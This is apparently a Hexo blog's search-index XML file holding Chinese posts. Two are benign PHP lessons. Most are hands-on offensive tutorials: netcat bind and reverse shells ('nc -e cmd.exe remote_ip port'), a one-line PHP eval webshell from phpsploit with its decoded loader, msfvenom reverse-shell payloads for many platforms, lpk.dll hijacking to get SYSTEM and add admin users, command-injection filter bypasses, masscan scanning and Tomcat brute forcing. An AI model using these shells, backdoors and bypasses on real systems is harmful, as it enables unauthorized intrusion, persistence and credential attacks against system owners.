<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>heredoc和nowdoc</title>
    <url>/2020/01/14/heredoc%E5%92%8Cnowdoc/</url>
    <content><![CDATA[<pre><code class="php">&lt;?php  
//heredoc  
$title = &quot;heredoc的用法&quot;;  
$str1 = &lt;&lt;&lt;heredoc  
&lt;h1&gt;$title&lt;/h1&gt;  
&lt;p&gt;当需要写一大段文字的时候，这段文件包含了单引号，双引号，还有转义符，用其他方式来输出往往  
比较麻烦。\n这时候可以用heredoc。&lt;/p&gt;  
&lt;p&gt;heredoc的语法如下：&lt;/p&gt;  
1.开始和结尾需要插入标识符；&lt;br /&gt;  
2.标识符和名称和变量名的要求一样；&lt;br /&gt;  
3.开始标识符前面必须有3个左尖括号：&lt;&lt;&lt;；&lt;br /&gt;  
4.结束标识符必须在一行开始处，前面不能有空格和其他字符；&lt;br /&gt;  
5.heredoc相当于加长版的双此号标识，即会解析变量和转义序列。&lt;br/&gt;  
heredoc;  
echo $str1;  

//nowdoc  
$str2 = &lt;&lt;&lt;&#39;nowdoc&#39;  
&lt;h1&gt;nowdoc的用法&lt;/h1&gt;  
&lt;p&gt;nowdoc是PHP5.3新增的特殊，语法和heredoc类似，主要的区别如下：&lt;/p&gt;  
1.开始标识必须用单引号引起来；&lt;br /&gt;  
2.nowdoc相当于加长版的单引号标识，不会解析变量和转义序列。&lt;br /&gt;  
例如：&lt;br /&gt;  
This is a test.\n$title  
nowdoc;  
echo $str2;  
?&gt;  </code></pre>
<p>输出如下：<br><img src="http://static.zybuluo.com/xmy2017/o5c98j2uboshnlwkixvkc1tz/image_1bftutff2h0l6sovgbcig1prq9.png" alt="image_1bftutff2h0l6sovgbcig1prq9.png-83kB"></p>
<p>&emsp;&emsp;在源代码中可以看到\n是成功转义了的：<br><img src="http://static.zybuluo.com/xmy2017/81wunchq3zd3fdo1alos6rfz/image_1bftuu41lrecmcm1pom1bk69slm.png" alt="image_1bftuu41lrecmcm1pom1bk69slm.png-79.4kB"></p>
]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>PHP学习</tag>
      </tags>
  </entry>
  <entry>
    <title>include和require</title>
    <url>/2020/01/14/include%E5%92%8Crequire/</url>
    <content><![CDATA[<p>PHP包含文件最常用的两种方式是include()和require()。</p>
<h4 id="include-和require"><a href="#include-和require" class="headerlink" title="include()和require()"></a>include()和require()</h4><p>include()的语法如下：</p>
<pre><code>include(/path/to/filename)</code></pre><p>和print、echo一样，include()可以省略括号，使用引号来代替。include包含的代码必须使用PHP界定符包含起来，否则是不能正确解析的。如果启用了PHP配置指令allow_url_fopen，include()还可以包含一个远程文件。</p>
<p>require()和include()相似，但它们有以下几个区别：<br>1.include()有返回值，require()没有。<br>2.require()是无条件包含，即将require()放入条件判断语句中，无论判断真假require()都会执行。<br>3.require()出错时，脚本将停止执行；而include()出错时，脚本会继续往下执行。</p>
<h4 id="include-once-和require-once"><a href="#include-once-和require-once" class="headerlink" title="include_once()和require_once()"></a>include_once()和require_once()</h4><p>和include()、require类似，include_once()和require_once()同样用于包含文件，但它们会在包含文件前首先确认该文件是否已经被包含了，如果已经包含了文件，则include_once()和require_once()就不再执行。 </p>
]]></content>
      <categories>
        <category>PHP学习</category>
      </categories>
      <tags>
        <tag>PHP学习</tag>
      </tags>
  </entry>
  <entry>
    <title>nc使用实战</title>
    <url>/2020/01/14/nc%E4%BD%BF%E7%94%A8%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><p>使用nc –h显示如下：</p>
<pre>
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [options] [hostname] [port]
options:
    -d              无命令行界面,使用后台模式
    -e prog         程序重定向 [危险!!]
    -g gateway      源路由跳跃点, 不超过8
    -G num          源路由指示器: 4, 8, 12, ...
    -h              获取帮助信息
    -i secs         延时设置,端口扫描时使用
    -l              监听入站信息
    -L              监听知道NetCat被结束(可断开重连)
    -n              以数字形式表示的IP地址
    -o file         使进制记录      -p port         打开本地端口
    -r              随机本地和远程的端口
    -s addr         本地源地址
    -t              以TELNET的形式应答入站请求
    -u              UDP 模式
    -v              显示详细信息 [使用=vv获取更详细的信息]
    -w secs         连接超时设置
    -z              I/O 模式 [扫描时使用]
端口号可以是单个的或者存在一个范围: m-n [包含值]
</pre>

<h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><p><font color="red">nc –vv –l –p port</font><br><img src="http://static.zybuluo.com/xmy2017/wo7739gvifyfn3dk333ktz8n/10.png" alt="10.png-5.3kB"></p>
<h3 id="创建临时后门"><a href="#创建临时后门" class="headerlink" title="创建临时后门"></a>创建临时后门</h3><p>靶机：<font color="red">nc –l –p port –e cmd.exe</font><br>攻击机：<font color="red">nc remote_ip port</font><br><img src="http://static.zybuluo.com/xmy2017/zzhwnf3rfpsx5r0k61ki08ly/11.png" alt="11.png-2.8kB"><br><img src="http://static.zybuluo.com/xmy2017/ikkx6flvahb82031ymu4t0vq/12.png" alt="12.png-30.3kB"></p>
<h3 id="创建telnet后门"><a href="#创建telnet后门" class="headerlink" title="创建telnet后门"></a>创建telnet后门</h3><p>靶机：<font color="red">nc –l –p port –t –e cmd.exe</font><br>攻击机：<font color="red">telnet remote_ip port</font><br><img src="http://static.zybuluo.com/xmy2017/27ubxy1nzbdaqqu4a8k9k16e/13.png" alt="13.png-2.8kB"><br><img src="http://static.zybuluo.com/xmy2017/6719nc1fi8tszmluo18eidei/14.png" alt="14.png-28kB"></p>
<h3 id="创建长期后门"><a href="#创建长期后门" class="headerlink" title="创建长期后门"></a>创建长期后门</h3><p>靶机：<font color="red">nc –l –p port –L –d –e cmd.exe</font><br>攻击机：<font color="red">nc remote_ip port</font><br><img src="http://static.zybuluo.com/xmy2017/1x4wykl6k1fz70syo727zrqe/15.png" alt="15.png-2.9kB"><br><img src="http://static.zybuluo.com/xmy2017/7it0xf679redlw1cikrgx2gv/16.png" alt="16.png-31.8kB"></p>
<h3 id="创建反向后门"><a href="#创建反向后门" class="headerlink" title="创建反向后门"></a>创建反向后门</h3><p>靶机：<font color="red">nc –e cmd.exe remote_ip port</font><br>攻击机：<font color="red">nc –l –p port</font><br><img src="http://static.zybuluo.com/xmy2017/bi9btixmslh066q3gtx37lq4/17.png" alt="17.png-3.4kB"><br><img src="http://static.zybuluo.com/xmy2017/hu6s7qr8e6jm29iep6t1jt6c/18.png" alt="18.png-30.6kB"></p>
<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>靶机：<font color="red">nc –l –u –p port &gt; file_path</font><br>攻击机：<font color="red">nc –u remote_ip port &lt; file_path</font><br><img src="http://static.zybuluo.com/xmy2017/sfh9pdiyn72ppnaqmxy4fmh5/19.png" alt="19.png-2.9kB"><br><img src="http://static.zybuluo.com/xmy2017/2c1sqh17z2ddl5m4vye2rs7r/20.png" alt="20.png-29.1kB"></p>
]]></content>
      <categories>
        <category>后门工具</category>
      </categories>
      <tags>
        <tag>后门工具</tag>
      </tags>
  </entry>
  <entry>
    <title>php后门工具phpsploit</title>
    <url>/2020/01/14/php%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7phpsploit/</url>
    <content><![CDATA[<p>最近看到一款php后门工具phpsploit，试用了一下，这里写个简单的体验说明。<br>工具下载地址：<font color="blue"><a href="https://github.com/nil0x42/phpsploit" target="_blank" rel="noopener">github传送门</a></font><br><img src="http://static.zybuluo.com/xmy2017/vti4pfidqoqmbub7z7nd643t/1.png" alt="1.png-270.3kB"></p>
<p align="center">（图是直接从github上粘贴过来的）</p>

<p>工具特性什么的我就懒得写了，自己看README。<br>上传到目标服务器的是php一句话木马，特点是使用SERVER进行连接和通信：</p>
<pre><code class="php">&lt;?php @eval($_SERVER[&#39;HTTP_PHPSPL01T&#39;]); ?&gt;</code></pre>
<p>下载后直接运行phpsploit脚本即可：<br><img src="http://static.zybuluo.com/xmy2017/62eo7yhydp2rz8dd9yzajkw9/2.png" alt="2.png-48.6kB"><br>设置一句话木马路径：<br><img src="http://static.zybuluo.com/xmy2017/uxr3529trpgiy97j1ltrrrl0/3.png" alt="3.png-24.3kB"><br>连接木马：<br><img src="http://static.zybuluo.com/xmy2017/7n19xo9sd5xpumwjndi47oin/4.png" alt="4.png-44kB"><br>获取phpinfo信息：<br><img src="http://static.zybuluo.com/xmy2017/o8tmng4612gr1mey8a1m8fj5/4.png" alt="4.png-118.7kB"><br>使用系统命令：<br><img src="http://static.zybuluo.com/xmy2017/7s0c6pss8fryfyx4k8m4hoso/6.png" alt="6.png-121.7kB"><br>使用wireshark查看通信数据包：<br><img src="http://static.zybuluo.com/xmy2017/3fg8yza4qzppe0zawl5jay2c/7.png" alt="7.png-204.4kB"><br>可以看到数据包都在Header中，经过了加密和编码，其中Phpsplo1T使用的是base64编码，解码后如下：</p>
<pre><code class="php">$s=$_SERVER;ksort($s);$x=&quot;&quot;;foreach($s as $a=&gt;$b)if(substr($a,0,7)==&#39;HTTP_ZZ&#39;)$x.=$b;eval(base64_decode(&quot;$x&quot;));</code></pre>
<p>查看access访问日志如下：<br><img src="http://static.zybuluo.com/xmy2017/nn9wf4rtb0n2ht2zji4zzktl/8.png" alt="8.png-140.1kB"></p>
]]></content>
      <categories>
        <category>后门工具</category>
      </categories>
      <tags>
        <tag>后门工具</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom后门生成工具</title>
    <url>/2020/01/14/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>渗透神器Metasploit的功能之一就是生成与利用攻击载荷（Payload），生成这些载荷的工具是msfvenom。下面我们来玩一个这个一听就知道十分好玩的工具。</p>
<h3 id="msfvenom的参数"><a href="#msfvenom的参数" class="headerlink" title="msfvenom的参数"></a>msfvenom的参数</h3><p>我们先来看一下msfvenom的命令行选项：</p>
<p>Options:<br>    -p, --payload    <payload>    指定需要使用的payload。如果需要自定义，请使用“-”或者stdin指定<br>      --payload-options        列出payload的选项<br>    -l, --list    [module_type]    列出指定模块的所有可用资源，模块类型包括payloads、encoders、nops和all<br>    -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度<br>    -f, --format    <format>        指定输出格式（使用--help-formats来获取msf支持的格式）<br>    -e, --encoder    <encoder>    指定需要使用的encoder（编码器）<br>    -a, --arch        <architecture>    指定payload的目标架构<br>       --plateform    <plateform>    指定payload的目标平台<br>    -s, --space    <length>        设置有效攻击载荷的最大长度<br>    -b, --bad-chars    <list>    设置规避字符集<br>    -i, --iterations    <count>        指定payload的编码次数<br>    -c, --add-code    <path>        指定一个附加的win32 shellcode文件<br>    -x, --template <path>        指定一个自定义的可执行文件作为模板<br>    -k, --keep                    保护模板程序的动作，注入的payload作为一个新进程运行<br>       --payload-options        列举payload的标准选项<br>    -o, --out    <path>            保存payload<br>    -v, --var-name     <name>        指定一个自定义变量，以确定输出格式<br>    --shellest                    最小化生成payload<br>    -h, --help                查看帮助选项<br>    --help-formats                查看msf支持的输出格式列表</p>
<h3 id="列出所有的模块资源"><a href="#列出所有的模块资源" class="headerlink" title="列出所有的模块资源"></a>列出所有的模块资源</h3><p>使用msfvenom –l来列出所有的模块资源， 可以指定模块payloads、encoders、nops和all。msfvenom支持的Payload极多，需要好好挖掘。如下：<br><img src="http://static.zybuluo.com/xmy2017/fgjgf3za6dg2velm4e316ny2/9.png" alt="9.png-198.5kB"></p>
<h3 id="常用的系统Payload"><a href="#常用的系统Payload" class="headerlink" title="常用的系统Payload"></a>常用的系统Payload</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre>msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f elf –o shell.elf</pre>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre>msfvenom –p windows/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f exe –o shell.exe</pre>
<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><pre>msfvenom –p osx/x86/shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f macho –o shell.macho</pre>
<h3 id="常用的脚本Payload"><a href="#常用的脚本Payload" class="headerlink" title="常用的脚本Payload"></a>常用的脚本Payload</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><pre>msfvenom –p php/meterpreter_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.php</pre>
<h4 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h4><pre>msfvenom –p windows/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f asp –o shell.asp</pre>
<h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><pre>msfvenom –p java/jsp_shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.jsp</pre>
<h4 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h4><pre>msfvenom –p java/jsp_shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f war –o shell.war</pre>
<h3 id="其他常用Payload"><a href="#其他常用Payload" class="headerlink" title="其他常用Payload"></a>其他常用Payload</h3><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><pre>msfvenom –p cmd/unix/reverse_python LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.py</pre>
<h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><pre>msfvenom –p cmd/unix/reverse_bash LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.sh</pre>
<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre>msfvenom –p cmd/unix/reverse_perl LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.pl</pre>
<h3 id="监听Payload运行"><a href="#监听Payload运行" class="headerlink" title="监听Payload运行"></a>监听Payload运行</h3><p>将Payload上传到目标主机运行，就可以连接Payload进行操作。监听Payload运行的操作如下：</p>
<p>&gt;&gt;&gt;use exploit/multi/handler<br>&gt;&gt;&gt;set <i>Your Payload</i><br>&gt;&gt;&gt;set <i>LHOST Your IP</i><br>&gt;&gt;&gt;set <i>LPORT Your Port</i><br>&gt;&gt;&gt;exploit</p>
<p>注意其中Payload、LHOST和LPORT的设置必须和生成Payload时的设置一样。</p>
]]></content>
      <categories>
        <category>后门工具</category>
      </categories>
      <tags>
        <tag>后门工具</tag>
      </tags>
  </entry>
  <entry>
    <title>lpk后门的使用</title>
    <url>/2020/01/14/lpk%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="什么是lpk"><a href="#什么是lpk" class="headerlink" title="什么是lpk"></a>什么是lpk</h3><p>lpk.dll是一个系统文件，它位于system32目录下，每个可执行文件运行之前都会加它。Windows系统的特性是先判断当前文件目录是否存在lpk.dll文件，如果不存在，再判断sytem32目录。基于这个特性，lpk的劫持就产生了。</p>
<h3 id="T00ls-Lpk-Sethc"><a href="#T00ls-Lpk-Sethc" class="headerlink" title="T00ls Lpk Sethc"></a>T00ls Lpk Sethc</h3><p>这款工具是用于劫持lpk的后门，可以当作辅助提权之用。下面介绍它的用法。<br>使用流程大体如下：<br>（1）生成lpk.dll文件；<br>（2）上传lpk.dll文件到目标服务器有可执行文件的目录，等待管理员运行可执行文件；<br>（3）使用lpk后门控制目标服务器。</p>
<h4 id="生成lpk-dll文件"><a href="#生成lpk-dll文件" class="headerlink" title="生成lpk.dll文件"></a>生成lpk.dll文件</h4><p>生成lpk.dll文件前请关闭杀毒软件，否则会生成失败。生成过程如下：<br><img src="http://static.zybuluo.com/xmy2017/o5cu6lrozxgby2u2ynns6prs/6.png" alt="6.png-29.3kB"><br>如果目标主机没有开放3389，可以钩选“执行CMD”，使用命令开启3389端口。也可以通过配置邮件通知来获知管理员是否执行后门。这里的“Sethc启动设置”是指启用后门的组合键，如果不知道键值查看热键代码表，此处为A键和B键。<br>点击“生成”即可生成lpk.dll文件，这里需要注意的是命名一定要是“lpk.dll”，不能更改。生成成功后不要再运行T00ls Lpk Sethc程序，否则自己就中木马了。</p>
<h4 id="上传lpk-dll到目标服务器"><a href="#上传lpk-dll到目标服务器" class="headerlink" title="上传lpk.dll到目标服务器"></a>上传lpk.dll到目标服务器</h4><p>将lpk.dll上传到目标服务器，需要目录里面有可执行文件。这里我使用大马进行上传：<br><img src="http://static.zybuluo.com/xmy2017/vzi7q83y4w6ahp1pw7o7gs4h/7.png" alt="7.png-8.5kB"><br>上传成功后，需要等待管理员执行目录中的可执行文件，才能运行后门。这里我既然已经上传了大马了，所以我可以上传一个cmd.exe到该目录，然后运行它：<br><img src="http://static.zybuluo.com/xmy2017/ryyldqf5g9491caeaphmryzy/8.png" alt="8.png-5.9kB"><br>这样就顺利地把后门执行起来了。</p>
<h4 id="使用lpk后门"><a href="#使用lpk后门" class="headerlink" title="使用lpk后门"></a>使用lpk后门</h4><p>远程连接目标服务器，出现如图界面后连接按下5次shift键：<br><img src="http://static.zybuluo.com/xmy2017/aiu2fncsni1bpgyjiktnev4u/9.png" alt="9.png-26.8kB"><br>出现如下界面：<br><img src="http://static.zybuluo.com/xmy2017/jn0h0ael1coqee57ihqe7pob/10.png" alt="10.png-33kB"><br>这时候同时按下设置的组合键（我这里是A键和B键），如果不成功就多按几次，成功会出现密码输入框：<br><img src="http://static.zybuluo.com/xmy2017/y53n83eknykfbh5lngnfgd1v/11.png" alt="11.png-27.6kB"><br>输入设置的密码，接下来就是愉快的玩了：<br><img src="http://static.zybuluo.com/xmy2017/oh72xke36i5c6ujcjfwomqsi/12.png" alt="12.png-22.3kB"><br>可以按“CmdShell”调出cmd窗口，可以看到，已经提权成system了：<br><img src="http://static.zybuluo.com/xmy2017/av2ptm2xwoui4243gsrui8w3/13.png" alt="13.png-34.7kB"><br>可以添加用户并加入管理员组：<br><img src="http://static.zybuluo.com/xmy2017/sbexbf6wb0cebskgduxugw0g/14.png" alt="14.png-19.8kB"><br>可以按“Explorer”调出Windows界面：<br><img src="http://static.zybuluo.com/xmy2017/lig3kiydw2peaa3yeekurpr9/15.png" alt="15.png-32.9kB"><br>功能很多，想怎么玩就怎么玩……</p>
]]></content>
      <categories>
        <category>后门工具</category>
      </categories>
      <tags>
        <tag>后门工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令执行小技巧</title>
    <url>/2020/01/14/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>分别在Linux和PHP环境下测试，PHP测试脚本如下：</p>
<pre><code class="php">&lt;?php
    $cmd = $_GET[&#39;cmd&#39;];
    $black = array(&#39; &#39;);
    str_ireplace($black, &#39;&#39;, $cmd, $i);
    if($i != 0)
    {
        die(&quot;Attack!&quot;);
    }
    else
    {
        system($cmd);
    }
?&gt;</code></pre>
<h4 id="小于号（-lt-）"><a href="#小于号（-lt-）" class="headerlink" title="小于号（&lt;）"></a>小于号（&lt;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/6u6l6n126dc253w47wtjgcs8/1.png" alt="1.png-15.7kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/59lgqax0jepw9k86wdv9gpfb/2.png" alt="2.png-59.7kB"> </p>
<h4 id="两个尖括号（-lt-gt-）"><a href="#两个尖括号（-lt-gt-）" class="headerlink" title="两个尖括号（&lt;&gt;）"></a>两个尖括号（&lt;&gt;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/elbqnmkcxvs9td6pbg3dxbem/3.png" alt="3.png-12.5kB"><br>PHP环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/ar1kv8jb8yumkfjig0x3iuyu/4.png" alt="4.png-62.6kB"> </p>
<h4 id="Tab键（-09）"><a href="#Tab键（-09）" class="headerlink" title="Tab键（%09）"></a>Tab键（%09）</h4><p>Linux环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/mr6mzy7ali916mydssalrp8f/5.png" alt="5.png-17.6kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/m3qkysgcovn7kafap2206n7l/6.png" alt="6.png-59.5kB"> </p>
<h4 id="IFS"><a href="#IFS" class="headerlink" title="$IFS$"></a>$IFS$</h4><p>Linux环境下，$IFS$(1-9)（文件名）都可以，0和两位以上的整数就无法识别了：<br><img src="http://static.zybuluo.com/xmy2017/9294d50xer6a6d9c67mqcnrq/7.png" alt="7.png-48.9kB"><br><img src="http://static.zybuluo.com/xmy2017/1lz86v45k3p0v2aup0h3w1pg/8.png" alt="8.png-60.8kB"><br> PHP环境下，$IFS$后面接0以上（不包括0）的整数都可以识别：<br><img src="http://static.zybuluo.com/xmy2017/0whlfbzvnlkgrppa8amxvvso/9.png" alt="9.png-71.1kB"> </p>
<h4 id="IFS-1"><a href="#IFS-1" class="headerlink" title="${IFS}"></a>${IFS}</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/bvcsje4dopmxo7bjinr4e7pb/10.png" alt="10.png-13.1kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/2jqnadkzr3zz7k6rkkyf5q7g/11.png" alt="11.png-64kB"> </p>
<h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><h4 id="0a"><a href="#0a" class="headerlink" title="%0a"></a>%0a</h4><p>Linux环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/6hnc68ehmww57bwjj9xigd5i/12.png" alt="12.png-18.1kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/xy4fduy9r9dh1oc632z2l06o/13.png" alt="13.png-16.6kB"></p>
<h4 id="0d"><a href="#0d" class="headerlink" title="%0d"></a>%0d</h4><p>Linux环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/e63iaukpnk5zgtfx1e3ns15k/14.png" alt="14.png-18.6kB"><br>PHP环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/u4du5552skxn7305z1kx3mjc/15.png" alt="15.png-12.6kB"> </p>
<h4 id="分号（-）"><a href="#分号（-）" class="headerlink" title="分号（;）"></a>分号（;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/erfzholf35yyxa8na9kaieek/16.png" alt="16.png-55.5kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/rgb8kwav0g41k2fu54x800bh/17.png" alt="17.png-15.6kB"> </p>
<h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/6l646edagc2pqlkad26k7z3s/18.png" alt="18.png-106kB"></p>
<h4 id="管道符（-）"><a href="#管道符（-）" class="headerlink" title="管道符（|）"></a>管道符（|）</h4><p>管道符只会执行后一个指令：<br><img src="http://static.zybuluo.com/xmy2017/xteyvn27qy446q5o611bd03d/19.png" alt="19.png-11.6kB"></p>
<h3 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h3><h4 id="（-00-20-）"><a href="#（-00-20-）" class="headerlink" title="（%00%20#）"></a>（%00%20#）</h4><p>只会执行前一个指令：<br><img src="http://static.zybuluo.com/xmy2017/0z1vyqhwgohrfsgigf8r9nff/20.png" alt="20.png-15.4kB"></p>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="参数定义"><a href="#参数定义" class="headerlink" title="参数定义"></a>参数定义</h4><p>比如在限制不允许使用cat的情况下遍历目录，Linux环境下可以这样使用：<br><img src="http://static.zybuluo.com/xmy2017/pshm0c4pursmhwecmty8mqpb/21.png" alt="21.png-45kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/b2fp5nzlxcx69wujya6493vf/22.png" alt="22.png-68.5kB"><br>####4.2 base64编码<br><img src="http://static.zybuluo.com/xmy2017/nxbordhxqkvmhif0zpuxy5wo/23.png" alt="23.png-18.8kB"><br>编码的内容为“cat test.txt”。</p>
<p>参考：<br><a href="http://url.cn/5NsHbNP" target="_blank" rel="noopener">http://url.cn/5NsHbNP</a></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>masscan扫描</title>
    <url>/2020/01/14/masscan%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<p>Masscan号称是最快的互联网端口扫描器，据说可以在六分钟内扫遍互联网。Masscan可以运行在Linux和Mac OS下。</p>
<h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><p>在Kali系统中安装方法如下：</p>
<pre><code>apt-get install git gcc make libcap-dev
git clone https://github.com/robertdavidgraham/masscan
cd masscan
make</code></pre><p>测试是否安装成功：</p>
<pre><code>make regress</code></pre><p><img src="http://static.zybuluo.com/xmy2017/v53okv1j02bt64a8e1midgi0/1.png" alt="1.png-61.8kB"></p>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="扫描指定网段指定端口"><a href="#扫描指定网段指定端口" class="headerlink" title="扫描指定网段指定端口"></a>扫描指定网段指定端口</h4><pre><code>masscan -p445,3389 192.168.31.0/24</code></pre><p><img src="http://static.zybuluo.com/xmy2017/s1nuviog6gygz2fisabiflsc/2.png" alt="2.png-112kB"></p>
<h4 id="配置文件定制扫描"><a href="#配置文件定制扫描" class="headerlink" title="配置文件定制扫描"></a>配置文件定制扫描</h4><pre><code>masscan -p445,3389 192.168.31.0/24 --echo &gt; masscan.conf
masscan -c masscan.conf --rate 1000</code></pre><p><img src="http://static.zybuluo.com/xmy2017/gwr17ozcrp9xtdc1ktovqkrw/3.png" alt="3.png-129kB"></p>
<p>配置文件内容如下：<br><img src="http://static.zybuluo.com/xmy2017/40fytygxl1b8aemnhuqxx1qe/4.png" alt="4.png-391kB"></p>
<p>可以通过修改配置文件来定制扫描的参数。</p>
<h4 id="banner获取"><a href="#banner获取" class="headerlink" title="banner获取"></a>banner获取</h4><pre><code>masscan 192.168.31.0/24 -p80 –banners</code></pre><p><img src="http://static.zybuluo.com/xmy2017/vjd1ofbby9f1b0y0rpbya9cs/5.png" alt="5.png-151.3kB"></p>
<h4 id="结果输出到文件"><a href="#结果输出到文件" class="headerlink" title="结果输出到文件"></a>结果输出到文件</h4><pre><code>masscan 192.168.31.0/24 -p80 -oX results.xml</code></pre>]]></content>
      <categories>
        <category>扫描工具</category>
      </categories>
      <tags>
        <tag>扫描工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat认证爆破</title>
    <url>/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<p>Tomcat使用的是基础认证，基础认证的数据包格式如下：<br><img src="http://static.zybuluo.com/xmy2017/0ct4qmyouj4v0jevqn6x761y/1.png" alt="1.png-25.5kB"><br>将base64字符串解码如下：<br><img src="http://static.zybuluo.com/xmy2017/y143saychc1e2k80dmp4h4a1/2.png" alt="2.png-15.5kB"><br>很多人对Tomcat认证的爆破都不怎么熟悉，下面介绍两种方法。</p>
<h4 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h4><p>抓包发送到Intruder，爆破只选择base64编码的字符串：<br><img src="http://static.zybuluo.com/xmy2017/mpdp633nt25lwrbxt6dtauri/3.png" alt="3.png-57.5kB"><br>Payload type中选择Custom iterator，Custom iterator表示“自定义迭代器”：<br><img src="http://static.zybuluo.com/xmy2017/cgj153d9m6ci19yrq2bg5spx/4.png" alt="4.png-19.4kB"><br>Tomcat认证的Payload分成三部分，第一部分是用户名，第二部分是冒号，第三部分是密码，所以Payload配置如下：<br><img src="http://static.zybuluo.com/xmy2017/uqqokm9vxamo779tblokutev/5.png" alt="5.png-25.8kB"><br><img src="http://static.zybuluo.com/xmy2017/ru0kin2lwza36fbwuc795lpw/6.png" alt="6.png-25.8kB"><br><img src="http://static.zybuluo.com/xmy2017/83plie3m1cm002surbpgl16x/7.png" alt="7.png-31.5kB"><br>认证中还使用了base64编码技术，在Payload Processing中设置：<br><img src="http://static.zybuluo.com/xmy2017/pingr0jw8114jxuit75p7trg/8.png" alt="8.png-36.6kB"><br>最后在Payload Encoding中取消勾选URL-encode，基础认证不需要进行URL编码：<br><img src="http://static.zybuluo.com/xmy2017/eir4a1w8lltvgjpajzp300px/9.png" alt="9.png-11.7kB"><br>最后Attack：<br><img src="http://static.zybuluo.com/xmy2017/d7e6rsucu7imwi1cnlv3ci5v/10.png" alt="10.png-81.2kB"></p>
